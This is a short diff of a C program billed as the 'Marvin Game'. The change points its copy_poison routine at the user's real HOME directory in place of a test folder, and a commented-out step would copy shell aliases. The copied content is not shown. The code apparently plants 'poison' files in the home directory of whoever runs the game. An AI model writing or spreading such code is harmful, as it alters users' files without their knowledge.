@@ -42,13 +42,13 @@ int	setup_game(int file_count, char **envp)
 	char	home_buffer[PATH_MAX];
 	// char	*cp_command[] = {"cp", "poison", "./tmp", NULL};
 
-	// if (!(desktop_dir = opendir(getenv("HOME"))))
-	// 	return (dprintf(2, "Could not access to Desktop\n"), 1);
-	// printf("%s\n", realpath(getenv("HOME"), home_buffer));
-	// if (copy_poison(file_count, home_buffer, envp))
-	// 	return (1);
-	if (copy_poison(file_count, "./tmp", envp))
-		return (dprintf(2, "Pas bon!\n"), 1);
+	if (!(desktop_dir = opendir(getenv("HOME"))))
+		return (dprintf(2, "Could not access to Desktop\n"), 1);
+	printf("%s\n", realpath(getenv("HOME"), home_buffer));
+	if (copy_poison(file_count, home_buffer, envp))
+		return (1);
+	// if (copy_poison(file_count, "./tmp", envp))
+	// 	return (dprintf(2, "Pas bon!\n"), 1);
 	// if (copy_alias(file_count, envp))
 	// 	return (1);
 	return (0);
@@ -63,6 +63,6 @@ int	main(int argc, char **argv, char **envp)
 	if (argc == 2)
 		file_count = atoi(argv[1]);
 	file_count = max(file_count, 2);
-	printf("\n----------Start Marvin Game----------\nParams:\nfiles = %d\n", file_count);
+	printf("\n----------Start Marvin Game----------\nParams:\nfiles = %d\n--------------------\n", file_count);
 	return (setup_game(file_count, envp));
 }
